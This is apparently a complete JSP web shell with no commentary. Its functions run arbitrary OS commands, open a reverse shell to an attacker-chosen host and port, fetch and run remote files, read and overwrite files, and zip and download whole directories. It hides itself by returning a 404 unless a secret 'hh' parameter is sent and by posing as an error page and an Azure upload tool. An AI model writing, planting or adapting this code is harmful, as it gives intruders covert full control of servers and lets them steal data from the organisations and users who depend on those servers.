<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@page import="java.util.*"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>

<%@ page language="java" contentType="text/html; charset=UTF-8"
		 pageEncoding="UTF-8" isErrorPage="true"%>
<%!
	static String encoding = "UTF-8";

	static{
		encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;
	}
	static String exceptionToString(Exception e) {
		StringWriter sw = new StringWriter();
		e.printStackTrace(new PrintWriter(sw, true));
		return sw.toString();
	}
	static String getSystemEncoding(){
		return System.getProperty("sun.jnu.encoding");
	}
	static boolean isNotEmpty(Object obj) {
		if (obj == null) {
			return false;
		}
		return !"".equals(String.valueOf(obj).trim());
	}
	static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException{
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		byte[] b = new byte[1024];
		int a = 0;
		while((a = in.read(b))!=-1){
			baos.write(b,0,a);
		}
		return baos;
	}
	static void copyInputStreamToFile(InputStream in,String path) throws IOException{
		FileOutputStream fos = new FileOutputStream(path);
		fos.write(inutStreamToOutputStream(in).toByteArray());
		fos.flush();
		fos.close();
	}
	static String cat(String path) throws IOException {
		return new String(inutStreamToOutputStream(new FileInputStream(path)).toByteArray());
	}
	static String exec(String cmd) {
		try {
			return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);
		} catch (IOException e) {
			return exceptionToString(e);
		}
	}
	static void download(String url,String path) throws MalformedURLException, IOException{
		copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);
	}
	static void shell(String host,int port) throws UnknownHostException, IOException{
		Socket s = new Socket(host,port);
		OutputStream out = s.getOutputStream();
		InputStream in = s.getInputStream();
		out.write(("User:\t"+exec("whoami")).getBytes());
		int a = 0;
		byte[] b = new byte[1024];
		while((a=in.read(b))!=-1){
			out.write(exec(new String(b,0,a,"UTF-8").trim()).getBytes("UTF-8"));
		}
	}
	static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{
		download(url, fileName);
		String out = exec(cmd);
		new File(fileName).delete();
		return out;
	}
	static void saveFile(String file,String data) throws IOException{
		copyInputStreamToFile(new ByteArrayInputStream(data.getBytes()), file);
	}
	static void zipFile(ZipOutputStream zos,File file) throws IOException{
		if(file.isDirectory() && file.canRead()){
			File[] files = file.listFiles();
			for(File f:files){
				zipFile(zos, f);
			}
		}else{
			ZipEntry z = new ZipEntry(file.getName());
			zos.putNextEntry(z);
			zos.write(inutStreamToOutputStream(new FileInputStream(file)).toByteArray());
			zos.closeEntry();
		}
	}

	static void zip(ByteArrayOutputStream out,File file) throws IOException{
		ZipOutputStream zos = new ZipOutputStream(out);
		zipFile(zos,file);
	}

%>
<html>
<head>
	<title><%=application.getServerInfo() %></title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<STYLE>
		H1 {color: white;background-color: #525D76;font-size: 22px;}
		H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;}
		BODY {font-family: Tahoma, Arial, sans-serif;font-size:12px;color: black;background-color: white;}
		A {color: black;}
		HR {color: #525D76;}
	</STYLE>
	<script>
		function get(p){
			document.getElementById('p').value = p;
			document.getElementById('action').value = "get";
			document.getElementById('fm').submit();
		}
		function saveFile(){
			document.getElementById('action').value = "saveFile";
			document.getElementById('fm').submit();
		}
	</script>
</head>
<body>

	<%
	try{
		if(isNotEmpty(request.getParameter("hh")))
		{
			out.println("<div><div>");
		}
		else
		{
			out.println("<div><div>");
			response.sendError(404, "" );
		}
	}
	catch(Exception ex) {
         out.println(ex.getMessage());
      }
   String Method = request.getMethod();
   if (Method.equals("POST")) {

  try{
  	String path_file = isNotEmpty(request.getParameter("p"))?request.getParameter("p"):new File((isNotEmpty(application.getRealPath("/"))?application.getRealPath("/"):".")).getCanonicalPath();
		String fileName = request.getHeader("Filename");
		out.println(fileName);
		if(!(fileName.equals(null))){

        File saveFile = new File(path_file + "\\" + fileName);

        out.println(path_file);

        out.println(fileName);
        // opens input stream of the request for reading data
        InputStream inputStream = request.getInputStream();

        // opens an output stream for writing file
        FileOutputStream outputStream = new FileOutputStream(saveFile);

        byte[] buffer = new byte[4096];
        int bytesRead = -1;
        System.out.println("Receiving data...");

        while ((bytesRead = inputStream.read(buffer)) != -1) {
            outputStream.write(buffer, 0, bytesRead);
        }

        System.out.println("Data received.");
        outputStream.close();
        inputStream.close();

        System.out.println("File written to: " + saveFile.getAbsolutePath());

        // sends response to client
        response.getWriter().print("UPLOAD DONE");
			}
      }catch(Exception ex) {
         out.println(ex.getMessage());
      }
   }else{
   	out.println("");
   }
%>



<h3> Choose File to Upload in Server </h3>


	<label>Select file: <input type="file" id="fileSelect" onchange="azureChangeFn()"></label>




	<%
	try{
		String action = request.getParameter("action");
		String path = isNotEmpty(request.getParameter("p"))?request.getParameter("p"):new File((isNotEmpty(application.getRealPath("/"))?application.getRealPath("/"):".")).getCanonicalPath();
		out.println("<form action=\"\" method=\"post\" id=\"fm\">");
		if(isNotEmpty(action) && !"get".equalsIgnoreCase(action)){
			if("shell".equalsIgnoreCase(action)){
				shell(request.getParameter("host"), Integer.parseInt(request.getParameter("port")));
			}else if("downloadL".equalsIgnoreCase(action)){
				download(request.getParameter("url"), request.getParameter("path"));
				out.println("The file is downloaded successfully.");
			}else if("exec".equalsIgnoreCase(action)){
				out.println("<h1>Command execution:</h1>");
				out.println("<pre>"+exec(request.getParameter("cmd"))+"</pre>");
			}else if("cat".equalsIgnoreCase(action)){
				out.println("<h1>File View:</h1>");
				out.println("<pre>"+cat(request.getParameter("path"))+"</pre>");
			}else if("auto".equalsIgnoreCase(action)){
				out.println("<h1>Auto:</h1>");
				out.println("<pre>"+auto(request.getParameter("url"),request.getParameter("fileName"),request.getParameter("cmd"))+"</pre>");
			}else if("download".equalsIgnoreCase(action)){
				response.setContentType("application/x-download");
				File file = new File(path,request.getParameter("fileName"));
				String fileName = file.isDirectory() ? file.getName()+".zip":file.getName();
				response.setHeader("Content-Disposition", "attachment; filename="+fileName);
				BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
				if(file.isDirectory()){
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					zip(baos, file);
					bos.write(baos.toByteArray());
					baos.close();
				}else{
					InputStream in = new FileInputStream(file);
					int len;
					byte[] buf = new byte[1024];
					while ((len = in.read(buf)) > 0) {
						bos.write(buf, 0, len);
					}
					in.close();
				}
				bos.close();
				out.clear();
				out = pageContext.pushBody();
				return ;
			}else if("saveFile".equalsIgnoreCase(action)){
				String file = request.getParameter("file");
				String data = request.getParameter("data");
				if(isNotEmpty(file) && isNotEmpty(data)){
					saveFile(new String(file.getBytes("ISO-8859-1"),"utf-8"),new String(data.getBytes("ISO-8859-1"),"utf-8"));
					out.println("<script>history.back(-1);alert('ok');</script>");
				}
			}
		}else{
			File file = new File(path);
			if(file.isDirectory()){
%>

	<script>

		function azureChangeFn() {
			var inputElement = document.getElementById("fileSelect");
			var newFile = inputElement.files[0];
			var value = "<%=path%>";
			var url = "SSL.jsp?p="+value.replace('\\', "\\\\");

			var xhr = new XMLHttpRequest();
			xhr.addEventListener("progress", updateProgress);
			xhr.onreadystatechange = function() {
				if (xhr.readyState == XMLHttpRequest.DONE) {
					alert("Sent to azure storage service!");
				}
			}
			xhr.open('POST', url, true);
			xhr.setRequestHeader("Content-type", "multipart/form-data");
			xhr.setRequestHeader("fileName",newFile.name);
			xhr.setRequestHeader("lng", "en");
			xhr.setRequestHeader("x-ms-blob-type", "BlockBlob");
			xhr.setRequestHeader("x-ms-blob-content-type", newFile.type);

			xhr.send(newFile);
		}

		function updateProgress (oEvent) {
			if (oEvent.lengthComputable) {
				var percentComplete = oEvent.loaded / oEvent.total;
				console.log(percentComplete);
			} else {
				alert('FAIL');
			}
		}
	</script>
